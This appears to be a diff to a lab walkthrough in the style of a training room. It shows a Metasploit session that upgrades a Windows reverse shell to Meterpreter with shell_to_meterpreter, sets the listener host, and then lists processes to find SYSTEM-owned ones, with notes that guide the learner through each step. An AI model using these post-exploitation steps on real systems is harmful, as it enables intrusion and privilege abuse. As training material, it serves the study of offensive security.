@@ -351,8 +351,10 @@ Active sessions
   Id  Name  Type               Information                                               Connection
   --  ----  ----               -----------                                               ----------
   1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  192.168.144.173:4444 -> 10.67.147.22:49195 (10.67.147.22)
+
 msf > use post/multi/manage/shell_to_meterpreter
 [*] Using configured payload windows/x64/shell/reverse_tcp
+
 msf post(multi/manage/shell_to_meterpreter) > show options
 Module options (post/multi/manage/shell_to_meterpreter):
    Name     Current Setting  Required  Description
@@ -362,10 +364,12 @@ Module options (post/multi/manage/shell_to_meterpreter):
    LPORT    4433             yes       Port for payload to connect to.
    SESSION                   yes       The session to run this module on
 View the full module info with the info, or info -d command.
+
 msf post(multi/manage/shell_to_meterpreter) > set LHOST 192.168.144.173
 LHOST => 192.168.144.173
 msf post(multi/manage/shell_to_meterpreter) > session -l
 [-] Unknown command: session. Did you mean sessions? Run the help command for more details.
+
 msf post(multi/manage/shell_to_meterpreter) > sessions -l
 Active sessions
 ===============
@@ -395,5 +399,28 @@ msf post(multi/manage/shell_to_meterpreter) > sessions -i 2
 [*] Starting interaction with 2...
 
 meterpreter > 
+```
 
+> [!important]
+> Select this (use MODULE_PATH). Show options, what option are we required to change? Session
+
+> [!important]
+> List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
+
+```
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]
+ 4     0     System                x64   0
+ 396   668   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
+ 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+...
+ 3028  1332  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
+
+meterpreter > 
 ```
